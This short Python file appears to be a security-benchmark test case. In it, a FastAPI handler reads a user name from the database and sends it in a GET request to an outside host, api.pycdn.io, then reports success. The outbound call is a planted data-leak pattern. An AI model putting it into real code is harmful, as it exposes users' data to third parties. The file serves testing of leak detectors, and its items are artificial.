# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
from app_runtime import db


async def BenchmarkTest11271(request: Request):
    db_value = db.fetch_one('SELECT name FROM users LIMIT 1')
    requests.get('https://api.pycdn.io/data', params={'q': str(db_value)}, verify=True)
    return {"updated": True}
